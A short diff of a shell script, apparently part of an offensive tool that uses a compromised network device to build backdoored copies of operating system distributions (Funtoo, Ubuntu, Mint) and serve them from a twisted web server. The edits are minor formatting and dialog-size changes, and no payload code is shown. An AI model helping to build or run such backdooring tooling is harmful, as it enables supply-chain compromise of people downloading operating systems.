@@ -201,12 +201,12 @@ install_pypi
 # However in this case I will use the compromised network
 # device to setup the backdoored files.
 
-mkdir work && cd work
-: ${DIALOG_OK=0}
-: ${DIALOG_CANCEL=1}
+mkdir work  # not doing && cd work in case work already exists.
+cd work
+
 tmpchecklist=/tmp/checklist.$$
 
-dialog --checklist "What operating system distributions would you like to backdoor?:" 20 40 13 \
+dialog --checklist "What operating system distributions would you like to backdoor?:" 25 40 15 \
         1 "Funtoo" off \
         2 "Ubuntu" off \
         3 "Mint" off \
@@ -274,7 +274,6 @@ dialog --checklist "What operating system distributions would you like to backdo
 done
 
 cd ..
-
 ls -l out
 
 # Start and fork twisted web server to host the backdoored files
